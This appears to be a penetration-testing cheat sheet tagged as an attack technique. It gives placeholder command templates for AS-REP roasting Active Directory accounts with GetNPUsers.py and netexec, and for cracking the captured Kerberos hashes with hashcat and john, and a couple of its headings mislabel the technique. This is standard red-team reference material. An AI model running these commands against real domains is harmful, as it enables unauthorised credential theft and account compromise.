# getnpusers
#plateform/linux #target/remote #cat/ATTACK

## ASREPRoast
```
GetNPUsers.py -usersfile <users_file|users.txt> -outputfile hashes.asreproast <domain>/
```

## ASREPRoasting with nxc
```
netexec ldap <TARGETS> -u <USER> -p <PASSWORD> --kerberoasting ASREPRoastables.txt --kdcHost <KeyDistributionCenter>
```


## Crack ASREPRoast
```
hashcat -m 18200 --force -a 0 <hash_file> </path/to/wordlist>
```

## crack GetUserSPNs using john
```
john --wordlist=$wordlist ASREProastables.txt
```

